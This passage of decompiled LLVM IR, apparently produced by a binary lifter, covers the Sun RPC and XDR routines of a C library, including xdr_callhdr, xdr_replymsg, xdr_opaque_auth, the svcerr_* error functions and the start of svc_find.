  %v2_17228 = icmp eq i32 %v0_17224, 0
  %v0_1722c = load i32, i32* @r4, align 4
  %v1_1722c = add i32 %v0_1722c, 4
  store i32 %v1_1722c, i32* @r1, align 4
  %v0_17230 = load i32, i32* @r5, align 4
  store i32 %v0_17230, i32* @r0, align 4
  br i1 %v2_17228, label %dec_label_pc_17268, label %dec_label_pc_17238

dec_label_pc_17238:                               ; preds = %entry
  %v0_17238 = call i32 @xdr_u_long()
  %v2_1723c = icmp eq i32 %v0_17238, 0
  %v0_17240 = load i32, i32* @r4, align 4
  %v1_17240 = add i32 %v0_17240, 8
  store i32 %v1_17240, i32* @r1, align 4
  %v0_17244 = load i32, i32* @r5, align 4
  store i32 %v0_17244, i32* @r0, align 4
  br i1 %v2_1723c, label %dec_label_pc_17268, label %dec_label_pc_1724c

dec_label_pc_1724c:                               ; preds = %dec_label_pc_17238
  %v0_1724c = call i32 @xdr_u_long()
  %v2_17250 = icmp eq i32 %v0_1724c, 0
  %v0_17254 = load i32, i32* @r4, align 4
  %v1_17254 = add i32 %v0_17254, 12
  store i32 %v1_17254, i32* @r1, align 4
  %v0_17258 = load i32, i32* @r5, align 4
  store i32 %v0_17258, i32* @r0, align 4
  br i1 %v2_17250, label %dec_label_pc_17268, label %dec_label_pc_17260

dec_label_pc_17260:                               ; preds = %dec_label_pc_1724c
  %v2_17260 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_17260, i32* @r4, align 4
  %v0_17264 = call i32 @xdr_u_long()
  br label %dec_label_pc_17268

dec_label_pc_17268:                               ; preds = %dec_label_pc_1724c, %dec_label_pc_17238, %entry, %dec_label_pc_17260
  ret i32 0

; uselistorder directives
  uselistorder label %dec_label_pc_17268, { 3, 0, 1, 2 }
}

define i32 @__GI__seterr_reply(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  %v1_17270 = add i32 %arg1, 8
  %v2_17270 = inttoptr i32 %v1_17270 to i32*
  %v3_17270 = load i32, i32* %v2_17270, align 4
  store i32 %v3_17270, i32* %ip.global-to-local, align 4
  %v2_17274 = icmp eq i32 %v3_17270, 0
  br i1 %v2_17274, label %dec_label_pc_17288, label %dec_label_pc_1727c

dec_label_pc_1727c:                               ; preds = %entry
  %v7_1727c = icmp eq i32 %v3_17270, 1
  br i1 %v7_1727c, label %dec_label_pc_17304, label %dec_label_pc_17338

dec_label_pc_17288:                               ; preds = %entry
  %v1_17288 = add i32 %arg1, 24
  %v2_17288 = inttoptr i32 %v1_17288 to i32*
  %v3_17288 = load i32, i32* %v2_17288, align 4
  store i32 %v3_17288, i32* %r2.global-to-local, align 4
  %v2_1728c = icmp eq i32 %v3_17288, 0
  br i1 %v2_1728c, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_17288
  store i32 0, i32* %arg2, align 4
  br label %.thread6

.thread6:                                         ; preds = %bb, %.thread2, %dec_label_pc_17364
  ret i32 %arg1

.thread:                                          ; preds = %dec_label_pc_17288
  switch i32 %v3_17288, label %dec_label_pc_172f0 [
    i32 5, label %dec_label_pc_172e0
    i32 1, label %dec_label_pc_172bc
    i32 2, label %dec_label_pc_172c4
    i32 3, label %dec_label_pc_172d0
    i32 4, label %dec_label_pc_172d8
  ]

dec_label_pc_172bc:                               ; preds = %.thread
  br label %dec_label_pc_172c8

dec_label_pc_172c4:                               ; preds = %.thread
  br label %dec_label_pc_172c8

dec_label_pc_172c8:                               ; preds = %dec_label_pc_172e0, %dec_label_pc_172d8, %dec_label_pc_172d0, %dec_label_pc_172bc, %dec_label_pc_17320, %dec_label_pc_172c4
  %v0_172c8 = phi i32 [ 12, %dec_label_pc_172e0 ], [ 11, %dec_label_pc_172d8 ], [ 10, %dec_label_pc_172d0 ], [ 8, %dec_label_pc_172bc ], [ 7, %dec_label_pc_17320 ], [ 9, %dec_label_pc_172c4 ]
  store i32 %v0_172c8, i32* %arg2, align 4
  br label %dec_label_pc_17348

dec_label_pc_172d0:                               ; preds = %.thread
  br label %dec_label_pc_172c8

dec_label_pc_172d8:                               ; preds = %.thread
  br label %dec_label_pc_172c8

dec_label_pc_172e0:                               ; preds = %.thread
  br label %dec_label_pc_172c8

dec_label_pc_172f0:                               ; preds = %.thread
  store i32 16, i32* %arg2, align 4
  %v2_172fc = add i32 %tmp, 4
  %v3_172fc = inttoptr i32 %v2_172fc to i32*
  store i32 0, i32* %v3_172fc, align 4
  br label %dec_label_pc_17330

dec_label_pc_17304:                               ; preds = %dec_label_pc_1727c
  %v1_17304 = add i32 %arg1, 12
  %v2_17304 = inttoptr i32 %v1_17304 to i32*
  %v3_17304 = load i32, i32* %v2_17304, align 4
  store i32 %v3_17304, i32* %r2.global-to-local, align 4
  %v7_17308 = icmp eq i32 %v3_17304, 1
  br i1 %v7_17308, label %dec_label_pc_17320, label %dec_label_pc_17310

dec_label_pc_17310:                               ; preds = %dec_label_pc_17304
  %v7_17310 = icmp eq i32 %v3_17304, 6
  br i1 %v7_17310, label %bb11, label %dec_label_pc_17328

bb11:                                             ; preds = %dec_label_pc_17310
  store i32 6, i32* %arg2, align 4
  br label %dec_label_pc_17348

dec_label_pc_17320:                               ; preds = %dec_label_pc_17304
  br label %dec_label_pc_172c8

dec_label_pc_17328:                               ; preds = %dec_label_pc_17310
  store i32 16, i32* %arg2, align 4
  %v3_1732c = add i32 %tmp, 4
  %v4_1732c = inttoptr i32 %v3_1732c to i32*
  %v5_1732c = load i32, i32* %ip.global-to-local, align 4
  store i32 %v5_1732c, i32* %v4_1732c, align 4
  br label %dec_label_pc_17330

dec_label_pc_17330:                               ; preds = %dec_label_pc_172f0, %dec_label_pc_17328
  %v0_17330 = load i32, i32* %r2.global-to-local, align 4
  %v2_17330 = add i32 %tmp, 8
  %v3_17330 = inttoptr i32 %v2_17330 to i32*
  store i32 %v0_17330, i32* %v3_17330, align 4
  br label %dec_label_pc_17348thread-pre-split

dec_label_pc_17338:                               ; preds = %dec_label_pc_1727c
  store i32 16, i32* %arg2, align 4
  %v3_17340 = load i32, i32* %v2_17270, align 4
  %v2_17344 = add i32 %tmp, 4
  %v3_17344 = inttoptr i32 %v2_17344 to i32*
  store i32 %v3_17340, i32* %v3_17344, align 4
  br label %dec_label_pc_17348thread-pre-split

dec_label_pc_17348thread-pre-split:               ; preds = %dec_label_pc_17338, %dec_label_pc_17330
  %v2_17348.pr = load i32, i32* %arg2, align 4
  br label %dec_label_pc_17348

dec_label_pc_17348:                               ; preds = %bb11, %dec_label_pc_17348thread-pre-split, %dec_label_pc_172c8
  %v2_17348 = phi i32 [ %v2_17348.pr, %dec_label_pc_17348thread-pre-split ], [ 6, %bb11 ], [ %v0_172c8, %dec_label_pc_172c8 ]
  %v7_1734c = icmp eq i32 %v2_17348, 7
  br i1 %v7_1734c, label %.thread2, label %.thread3

.thread2:                                         ; preds = %dec_label_pc_17348
  %v2_17350 = add i32 %arg1, 16
  %v3_17350 = inttoptr i32 %v2_17350 to i32*
  %v4_17350 = load i32, i32* %v3_17350, align 4
  %v3_17354 = add i32 %tmp, 4
  %v4_17354 = inttoptr i32 %v3_17354 to i32*
  store i32 %v4_17350, i32* %v4_17354, align 4
  br label %.thread6

.thread3:                                         ; preds = %dec_label_pc_17348
  %v7_1735c = icmp eq i32 %v2_17348, 9
  br i1 %v7_1735c, label %dec_label_pc_1737c, label %dec_label_pc_17364

dec_label_pc_17364:                               ; preds = %.thread3
  %v7_17364 = icmp eq i32 %v2_17348, 6
  br i1 %v7_17364, label %.thread5, label %.thread6

.thread5:                                         ; preds = %dec_label_pc_17364
  %v2_17368 = add i32 %arg1, 16
  %v3_17368 = inttoptr i32 %v2_17368 to i32*
  %v4_17368 = load i32, i32* %v3_17368, align 4
  %v3_1736c = add i32 %tmp, 4
  %v4_1736c = inttoptr i32 %v3_1736c to i32*
  store i32 %v4_17368, i32* %v4_1736c, align 4
  %v2_17370 = add i32 %arg1, 20
  br label %dec_label_pc_17388

dec_label_pc_1737c:                               ; preds = %.thread3
  %v1_1737c = add i32 %arg1, 28
  %v2_1737c = inttoptr i32 %v1_1737c to i32*
  %v3_1737c = load i32, i32* %v2_1737c, align 4
  %v2_17380 = add i32 %tmp, 4
  %v3_17380 = inttoptr i32 %v2_17380 to i32*
  store i32 %v3_1737c, i32* %v3_17380, align 4
  %v1_17384 = add i32 %arg1, 32
  br label %dec_label_pc_17388

dec_label_pc_17388:                               ; preds = %.thread5, %dec_label_pc_1737c
  %storemerge.in.in = phi i32 [ %v2_17370, %.thread5 ], [ %v1_17384, %dec_label_pc_1737c ]
  %storemerge.in = inttoptr i32 %storemerge.in.in to i32*
  %storemerge = load i32, i32* %storemerge.in, align 4
  %v2_17388 = add i32 %tmp, 8
  %v3_17388 = inttoptr i32 %v2_17388 to i32*
  store i32 %storemerge, i32* %v3_17388, align 4
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 %v2_17348, { 1, 0, 2 }
  uselistorder i32 %v0_172c8, { 1, 0 }
  uselistorder i32 %tmp, { 1, 4, 3, 0, 2, 6, 7, 5 }
  uselistorder i32* %r2.global-to-local, { 1, 0, 2 }
  uselistorder i32* %arg2, { 0, 6, 5, 4, 2, 3, 1, 7 }
  uselistorder i32 %arg1, { 8, 3, 5, 0, 2, 1, 7, 4, 6, 9 }
  uselistorder label %dec_label_pc_17388, { 1, 0 }
  uselistorder label %dec_label_pc_17348, { 1, 0, 2 }
  uselistorder label %dec_label_pc_17330, { 1, 0 }
  uselistorder label %dec_label_pc_172c8, { 4, 0, 1, 2, 5, 3 }
  uselistorder label %.thread6, { 2, 1, 0 }
}

define i32 @__GI_xdr_callhdr(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* @r1, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* @r0, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_17390 = load i32, i32* @r4, align 4
  store i32 %v3_17390, i32* %stack_var_-12, align 4
  %v6_17390 = load i32, i32* @r5, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_17398 = add i32 %arg2, 4
  %v3_17398 = inttoptr i32 %v2_17398 to i32*
  store i32 0, i32* %v3_17398, align 4
  %v0_1739c = load i32, i32* %r3.global-to-local, align 4
  %v1_1739c = add i32 %v0_1739c, 2
  store i32 %v1_1739c, i32* %r3.global-to-local, align 4
  %v2_173a0 = add i32 %arg2, 8
  %v3_173a0 = inttoptr i32 %v2_173a0 to i32*
  store i32 %v1_1739c, i32* %v3_173a0, align 4
  %v2_173a4 = load i32, i32* %arg1, align 4
  store i32 %v2_173a4, i32* %r3.global-to-local, align 4
  %v2_173a8 = icmp eq i32 %v2_173a4, 0
  store i32 %arg2, i32* @r4, align 4
  store i32 %tmp, i32* @r5, align 4
  br i1 %v2_173a8, label %dec_label_pc_173b8, label %dec_label_pc_17410

dec_label_pc_173b8:                               ; preds = %entry
  %v0_173b8 = call i32 @xdr_u_long()
  %v2_173bc = icmp eq i32 %v0_173b8, 0
  %v0_173c4 = load i32, i32* @r5, align 4
  store i32 %v0_173c4, i32* @r0, align 4
  br i1 %v2_173bc, label %dec_label_pc_17410, label %dec_label_pc_173cc

dec_label_pc_173cc:                               ; preds = %dec_label_pc_173b8
  %v0_173cc = call i32 @xdr_enum()
  %v2_173d0 = icmp eq i32 %v0_173cc, 0
  %v0_173d4 = load i32, i32* @r4, align 4
  %v1_173d4 = add i32 %v0_173d4, 8
  store i32 %v1_173d4, i32* @r1, align 4
  %v0_173d8 = load i32, i32* @r5, align 4
  store i32 %v0_173d8, i32* @r0, align 4
  br i1 %v2_173d0, label %dec_label_pc_17410, label %dec_label_pc_173e0

dec_label_pc_173e0:                               ; preds = %dec_label_pc_173cc
  %v0_173e0 = call i32 @xdr_u_long()
  %v2_173e4 = icmp eq i32 %v0_173e0, 0
  %v0_173e8 = load i32, i32* @r4, align 4
  %v1_173e8 = add i32 %v0_173e8, 12
  store i32 %v1_173e8, i32* @r1, align 4
  %v0_173ec = load i32, i32* @r5, align 4
  store i32 %v0_173ec, i32* @r0, align 4
  br i1 %v2_173e4, label %dec_label_pc_17410, label %dec_label_pc_173f4

dec_label_pc_173f4:                               ; preds = %dec_label_pc_173e0
  %v0_173f4 = call i32 @xdr_u_long()
  %v2_173f8 = icmp eq i32 %v0_173f4, 0
  %v0_173fc = load i32, i32* @r4, align 4
  %v1_173fc = add i32 %v0_173fc, 16
  store i32 %v1_173fc, i32* @r1, align 4
  %v0_17400 = load i32, i32* @r5, align 4
  store i32 %v0_17400, i32* @r0, align 4
  br i1 %v2_173f8, label %dec_label_pc_17410, label %dec_label_pc_17408

dec_label_pc_17408:                               ; preds = %dec_label_pc_173f4
  %v2_17408 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_17408, i32* @r4, align 4
  %v0_1740c = call i32 @xdr_u_long()
  br label %dec_label_pc_17410

dec_label_pc_17410:                               ; preds = %entry, %dec_label_pc_173f4, %dec_label_pc_173e0, %dec_label_pc_173cc, %dec_label_pc_173b8, %dec_label_pc_17408
  %v2_17414 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_17414, i32* @r4, align 4
  store i32 %v6_17390, i32* @r5, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %arg2, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_17410, { 5, 1, 2, 3, 4, 0 }
}

define i32 @__GI_xdr_rejected_reply(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_17418 = load i32, i32* @r4, align 4
  store i32 %v3_17418, i32* %stack_var_-12, align 4
  %v6_17418 = load i32, i32* @r5, align 4
  store i32 %tmp, i32* @r4, align 4
  store i32 %arg1, i32* @r5, align 4
  %v0_17424 = call i32 @xdr_enum()
  %v2_17428 = icmp eq i32 %v0_17424, 0
  br i1 %v2_17428, label %dec_label_pc_1747c, label %dec_label_pc_17430

dec_label_pc_17430:                               ; preds = %entry
  %v0_17430 = load i32, i32* @r4, align 4
  %v1_17430 = inttoptr i32 %v0_17430 to i32*
  %v2_17430 = load i32, i32* %v1_17430, align 4
  %v2_17434 = icmp eq i32 %v2_17430, 0
  %v1_17438 = add i32 %v0_17430, 4
  store i32 %v1_17438, i32* @r1, align 4
  %v0_1743c = load i32, i32* @r5, align 4
  store i32 %v0_1743c, i32* @r0, align 4
  br i1 %v2_17434, label %dec_label_pc_17450, label %dec_label_pc_17444

dec_label_pc_17444:                               ; preds = %dec_label_pc_17430
  %v7_17444 = icmp eq i32 %v2_17430, 1
  br i1 %v7_17444, label %dec_label_pc_17444.dec_label_pc_1746c_crit_edge, label %dec_label_pc_1747c

dec_label_pc_17444.dec_label_pc_1746c_crit_edge:  ; preds = %dec_label_pc_17444
  br label %dec_label_pc_1746c

dec_label_pc_17450:                               ; preds = %dec_label_pc_17430
  %v0_17450 = call i32 @xdr_u_long()
  %v2_17454 = icmp eq i32 %v0_17450, 0
  %v0_17458 = load i32, i32* @r4, align 4
  %v1_17458 = add i32 %v0_17458, 8
  store i32 %v1_17458, i32* @r1, align 4
  %v0_1745c = load i32, i32* @r5, align 4
  store i32 %v0_1745c, i32* @r0, align 4
  br i1 %v2_17454, label %dec_label_pc_1747c, label %dec_label_pc_17464

dec_label_pc_17464:                               ; preds = %dec_label_pc_17450
  %v2_17464 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_17464, i32* @r4, align 4
  store i32 %v6_17418, i32* @r5, align 4
  %v0_17468 = call i32 @xdr_u_long()
  %v0_1746c.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_1746c

dec_label_pc_1746c:                               ; preds = %dec_label_pc_17444.dec_label_pc_1746c_crit_edge, %dec_label_pc_17464
  %v0_1746c = phi i32 [ %v0_1743c, %dec_label_pc_17444.dec_label_pc_1746c_crit_edge ], [ %v0_1746c.pre, %dec_label_pc_17464 ]
  store i32 %v0_1746c, i32* @r0, align 4
  %v0_17478 = call i32 @xdr_enum()
  br label %dec_label_pc_1747c

dec_label_pc_1747c:                               ; preds = %dec_label_pc_17444, %dec_label_pc_17450, %entry, %dec_label_pc_1746c
  ret i32 0

; uselistorder directives
  uselistorder label %dec_label_pc_1747c, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_1746c, { 1, 0 }
}

define i32 @__GI_xdr_replymsg(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg2, i32* @r1, align 4
  store i32 %arg1, i32* @r0, align 4
  %v3_17484 = load i32, i32* @r4, align 4
  %v6_17484 = load i32, i32* @r5, align 4
  store i32 %arg2, i32* @r4, align 4
  store i32 %arg1, i32* @r5, align 4
  %v0_17494 = call i32 @xdr_u_long()
  %v2_17498 = icmp eq i32 %v0_17494, 0
  %v0_174a0 = load i32, i32* @r5, align 4
  store i32 %v0_174a0, i32* @r0, align 4
  br i1 %v2_17498, label %dec_label_pc_174e4, label %dec_label_pc_174a8

dec_label_pc_174a8:                               ; preds = %entry
  %v0_174a8 = call i32 @xdr_enum()
  %v2_174ac = icmp eq i32 %v0_174a8, 0
  br i1 %v2_174ac, label %dec_label_pc_174e4, label %dec_label_pc_174b4

dec_label_pc_174b4:                               ; preds = %dec_label_pc_174a8
  %v0_174b4 = load i32, i32* @r4, align 4
  %v1_174b4 = add i32 %v0_174b4, 4
  %v2_174b4 = inttoptr i32 %v1_174b4 to i32*
  %v3_174b4 = load i32, i32* %v2_174b4, align 4
  %v7_174b8 = icmp eq i32 %v3_174b4, 1
  br i1 %v7_174b8, label %dec_label_pc_174d0, label %dec_label_pc_174e4

dec_label_pc_174d0:                               ; preds = %dec_label_pc_174b4
  %v1_174c4 = add i32 %v0_174b4, 8
  %v1_174c0 = add i32 %v0_174b4, 12
  %v0_174bc = load i32, i32* @r5, align 4
  %v5_174d8 = inttoptr i32 %v1_174c4 to i32*
  %v6_174d8 = call i32 @xdr_union(i32 %v0_174bc, i32* %v5_174d8, i32 %v1_174c0, i32 ptrtoint (i32* @global_var_1dcfc.892 to i32), i32 0)
  br label %dec_label_pc_174e4

dec_label_pc_174e4:                               ; preds = %entry, %dec_label_pc_174a8, %dec_label_pc_174b4, %dec_label_pc_174d0
  %storemerge = phi i32 [ %v6_174d8, %dec_label_pc_174d0 ], [ 0, %dec_label_pc_174b4 ], [ 0, %dec_label_pc_174a8 ], [ 0, %entry ]
  store i32 %v3_17484, i32* @r4, align 4
  store i32 %v6_17484, i32* @r5, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder label %dec_label_pc_174e4, { 3, 2, 1, 0 }
}

define i32 @xdr_des_block() local_unnamed_addr {
entry:
  %v0_174f4 = load i32, i32* @r0, align 4
  %v1_174f4 = load i32, i32* @r1, align 4
  %v3_174f4 = inttoptr i32 %v0_174f4 to i32*
  %v4_174f4 = call i32 @xdr_opaque(i32* %v3_174f4, i32 %v1_174f4, i32 8)
  ret i32 %v4_174f4
}

define i32 @xdr_opaque_auth() local_unnamed_addr {
entry:
  %r5.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_174f8 = load i32, i32* @r4, align 4
  store i32 %v3_174f8, i32* %stack_var_-12, align 4
  %v6_174f8 = load i32, i32* @r5, align 4
  %v9_174f8 = load i32, i32* @lr, align 4
  %v0_174fc = load i32, i32* @r1, align 4
  %v0_17500 = load i32, i32* @r0, align 4
  store i32 %v0_17500, i32* %r5.global-to-local, align 4
  %v0_17504 = call i32 @xdr_enum()
  %v2_17508 = icmp eq i32 %v0_17504, 0
  br i1 %v2_17508, label %bb, label %bb4

bb:                                               ; preds = %entry
  %v3_17518 = load i32, i32* %stack_var_-12, align 4
  store i32 %v3_17518, i32* @r4, align 4
  store i32 %v6_174f8, i32* @r5, align 4
  ret i32 0

bb4:                                              ; preds = %entry
  %v1_17510 = add i32 %v0_174fc, 4
  %v1_1750c = add i32 %v0_174fc, 8
  %v0_1751c = load i32, i32* %r5.global-to-local, align 4
  %v2_17520 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_17520, i32* @r4, align 4
  store i32 %v6_174f8, i32* @r5, align 4
  store i32 %v9_174f8, i32* @lr, align 4
  %v4_17524 = inttoptr i32 %v0_1751c to i32*
  %v5_17524 = call i32 @xdr_bytes(i32* %v4_17524, i32 %v1_17510, i32 %v1_1750c, i32 400)
  ret i32 %v5_17524
}

define i32 @__GI_xdr_accepted_reply(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg2, i32* @r1, align 4
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_17528 = load i32, i32* @r4, align 4
  store i32 %v3_17528, i32* %stack_var_-12, align 4
  store i32 %arg2, i32* @r4, align 4
  store i32 %arg1, i32* @r5, align 4
  %v0_17534 = call i32 @xdr_opaque_auth()
  %v2_17538 = icmp eq i32 %v0_17534, 0
  %v0_17540 = load i32, i32* @r5, align 4
  store i32 %v0_17540, i32* @r0, align 4
  br i1 %v2_17538, label %dec_label_pc_175a8, label %dec_label_pc_17548

dec_label_pc_17548:                               ; preds = %entry
  %v0_17548 = call i32 @xdr_enum()
  %v2_1754c = icmp eq i32 %v0_17548, 0
  br i1 %v2_1754c, label %dec_label_pc_175a8, label %dec_label_pc_17554

dec_label_pc_17554:                               ; preds = %dec_label_pc_17548
  %v0_17554 = load i32, i32* @r4, align 4
  %v1_17554 = add i32 %v0_17554, 12
  %v2_17554 = inttoptr i32 %v1_17554 to i32*
  %v3_17554 = load i32, i32* %v2_17554, align 4
  %v2_17558 = icmp eq i32 %v3_17554, 0
  %v0_1755c = load i32, i32* @r5, align 4
  store i32 %v0_1755c, i32* @r0, align 4
  br i1 %v2_17558, label %dec_label_pc_17578, label %dec_label_pc_17564

dec_label_pc_17564:                               ; preds = %dec_label_pc_17554
  %v7_17564 = icmp eq i32 %v3_17554, 2
  %v1_17568 = add i32 %v0_17554, 16
  store i32 %v1_17568, i32* @r1, align 4
  br i1 %v7_17564, label %dec_label_pc_1758c, label %dec_label_pc_175ac

dec_label_pc_17578:                               ; preds = %dec_label_pc_17554
  %v1_17580 = add i32 %v0_17554, 20
  %v2_17580 = inttoptr i32 %v1_17580 to i32*
  %v3_17580 = load i32, i32* %v2_17580, align 4
  call void @__pseudo_branch(i32 %v3_17580)
  %v0_17584 = load i32, i32* @r0, align 4
  br label %dec_label_pc_175ac

dec_label_pc_1758c:                               ; preds = %dec_label_pc_17564
  %v0_1758c = call i32 @xdr_u_long()
  %v2_17590 = icmp eq i32 %v0_1758c, 0
  %v0_17594 = load i32, i32* @r4, align 4
  %v1_17594 = add i32 %v0_17594, 20
  store i32 %v1_17594, i32* @r1, align 4
  %v0_17598 = load i32, i32* @r5, align 4
  store i32 %v0_17598, i32* @r0, align 4
  br i1 %v2_17590, label %dec_label_pc_175a8, label %dec_label_pc_175a0

dec_label_pc_175a0:                               ; preds = %dec_label_pc_1758c
  %v2_175a0 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_175a0, i32* @r4, align 4
  %v0_175a4 = call i32 @xdr_u_long()
  br label %dec_label_pc_175a8

dec_label_pc_175a8:                               ; preds = %dec_label_pc_1758c, %dec_label_pc_17548, %entry, %dec_label_pc_175a0
  br label %dec_label_pc_175ac

dec_label_pc_175ac:                               ; preds = %dec_label_pc_17564, %dec_label_pc_17578, %dec_label_pc_175a8
  %v0_175ac = phi i32 [ 1, %dec_label_pc_17564 ], [ %v0_17584, %dec_label_pc_17578 ], [ 0, %dec_label_pc_175a8 ]
  ret i32 %v0_175ac

; uselistorder directives
  uselistorder label %dec_label_pc_175ac, { 2, 1, 0 }
  uselistorder label %dec_label_pc_175a8, { 3, 0, 1, 2 }
}

define i32 @svc_sendreply(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v1_175f8 = add i32 %arg1, 8
  %v2_175f8 = inttoptr i32 %v1_175f8 to i32*
  %v3_175f8 = load i32, i32* %v2_175f8, align 4
  %v1_17604 = add i32 %v3_175f8, 12
  %v2_17604 = inttoptr i32 %v1_17604 to i32*
  %v3_17604 = load i32, i32* %v2_17604, align 4
  call void @__pseudo_branch(i32 %v3_17604)
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @svcerr_noproc(i32 %arg1) local_unnamed_addr {
entry:
  %v1_17648 = add i32 %arg1, 8
  %v2_17648 = inttoptr i32 %v1_17648 to i32*
  %v3_17648 = load i32, i32* %v2_17648, align 4
  %v1_17654 = add i32 %v3_17648, 12
  %v2_17654 = inttoptr i32 %v1_17654 to i32*
  %v3_17654 = load i32, i32* %v2_17654, align 4
  call void @__pseudo_branch(i32 %v3_17654)
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @svcerr_decode(i32 %arg1) local_unnamed_addr {
entry:
  %v1_17698 = add i32 %arg1, 8
  %v2_17698 = inttoptr i32 %v1_17698 to i32*
  %v3_17698 = load i32, i32* %v2_17698, align 4
  %v1_176a4 = add i32 %v3_17698, 12
  %v2_176a4 = inttoptr i32 %v1_176a4 to i32*
  %v3_176a4 = load i32, i32* %v2_176a4, align 4
  call void @__pseudo_branch(i32 %v3_176a4)
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @svcerr_systemerr(i32 %arg1) local_unnamed_addr {
entry:
  %v1_176e8 = add i32 %arg1, 8
  %v2_176e8 = inttoptr i32 %v1_176e8 to i32*
  %v3_176e8 = load i32, i32* %v2_176e8, align 4
  %v1_176f4 = add i32 %v3_176e8, 12
  %v2_176f4 = inttoptr i32 %v1_176f4 to i32*
  %v3_176f4 = load i32, i32* %v2_176f4, align 4
  call void @__pseudo_branch(i32 %v3_176f4)
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @svcerr_auth(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_17720 = add i32 %arg1, 8
  %v2_17720 = inttoptr i32 %v1_17720 to i32*
  %v3_17720 = load i32, i32* %v2_17720, align 4
  %v1_17728 = add i32 %v3_17720, 12
  %v2_17728 = inttoptr i32 %v1_17728 to i32*
  %v3_17728 = load i32, i32* %v2_17728, align 4
  call void @__pseudo_branch(i32 %v3_17728)
  ret i32 %arg1
}

define i32 @svcerr_weakauth() local_unnamed_addr {
entry:
  %v0_17738 = load i32, i32* @r0, align 4
  %v2_17738 = call i32 @svcerr_auth(i32 %v0_17738, i32 5)
  ret i32 %v2_17738
}

define i32 @__GI_svcerr_noprog(i32 %arg1) local_unnamed_addr {
entry:
  %v1_17770 = add i32 %arg1, 8
  %v2_17770 = inttoptr i32 %v1_17770 to i32*
  %v3_17770 = load i32, i32* %v2_17770, align 4
  %v1_1777c = add i32 %v3_17770, 12
  %v2_1777c = inttoptr i32 %v1_1777c to i32*
  %v3_1777c = load i32, i32* %v2_1777c, align 4
  call void @__pseudo_branch(i32 %v3_1777c)
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @svcerr_progvers(i32 %arg1) local_unnamed_addr {
entry:
  %v1_177d0 = add i32 %arg1, 8
  %v2_177d0 = inttoptr i32 %v1_177d0 to i32*
  %v3_177d0 = load i32, i32* %v2_177d0, align 4
  %v1_177dc = add i32 %v3_177d0, 12
  %v2_177dc = inttoptr i32 %v1_177dc to i32*
  %v3_177dc = load i32, i32* %v2_177dc, align 4
  call void @__pseudo_branch(i32 %v3_177dc)
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @svc_find(i32 %arg1, i32 %arg2, i32* %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg3 to i32
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_177e8 = load i32, i32* @r4, align 4
  store i32 %v3_177e8, i32* %stack_var_-16, align 4
  %v6_177e8 = load i32, i32* @r5, align 4
  %v9_177e8 = load i32, i32* @r6, align 4
  store i32 %tmp, i32* @r5, align 4
  store i32 %arg1, i32* @r6, align 4
  store i32 %arg2, i32* @r4, align 4
  %v0_177f8 = call i32 @__rpc_thread_variables()
  store i32 %v0_177f8, i32* %r0.global-to-local, align 4
  %v1_177fc = add i32 %v0_177f8, 184
  %v2_177fc = inttoptr i32 %v1_177fc to i32*
  %v3_177fc = load i32, i32* %v2_177fc, align 4
  store i32 %v3_177fc, i32* %r0.global-to-local, align 4
  %v2_178282 = icmp eq i32 %v3_177fc, 0
  br i1 %v2_178282, label %dec_label_pc_17830, label %dec_label_pc_17808.lr.ph

dec_label_pc_17808.lr.ph:                         ; preds = %entry
  %v1_1780c.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_17808

dec_label_pc_17808:                               ; preds = %dec_label_pc_17808.lr.ph, %dec_label_pc_17820
  %v0_178305 = phi i32 [ 0, %dec_label_pc_17808.lr.ph ], [ %v0_17820, %dec_label_pc_17820 ]
  %v0_17820 = phi i32 [ %v3_177fc, %dec_label_pc_17808.lr.ph ], [ %v2_17824, %dec_label_pc_17820 ]
  %v1_17808 = add i32 %v0_17820, 4
  %v2_17808 = inttoptr i32 %v1_17808 to i32*
  %v3_17808 = load i32, i32* %v2_17808, align 4
  %v9_1780c = icmp eq i32 %v3_17808, %v1_1780c.pre
  br i1 %v9_1780c, label %dec_label_pc_17814, label %dec_label_pc_17820

